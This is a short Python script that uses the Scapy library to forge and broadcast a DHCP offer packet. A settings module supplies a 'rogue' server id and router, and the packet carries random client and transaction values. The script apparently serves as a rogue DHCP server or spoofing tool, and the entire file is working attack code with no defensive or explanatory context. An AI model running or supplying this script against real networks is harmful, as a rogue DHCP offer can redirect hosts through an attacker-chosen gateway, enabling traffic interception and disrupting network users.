#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, UDP, BOOTP, DHCP
import settings


dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff") \
            / IP(src='10.10.1.1', dst='255.255.255.255') \
            / UDP(sport=67, dport=68) \
            / BOOTP(op=2, yiaddr=RandIP(), siaddr=settings.rogue_serv, chaddr=RandIP(), xid=RandInt()) \
            / DHCP(options=[('message-type', 'offer'),("server_id", settings.rogue_serv), ("broadcast_address", settings.broadcast_address),\
            ("router", settings.router), ("subnet_mask", settings.subnet_mask), ('end')])
sendp(dhcp_offer, iface=settings.source_interface, verbose=0)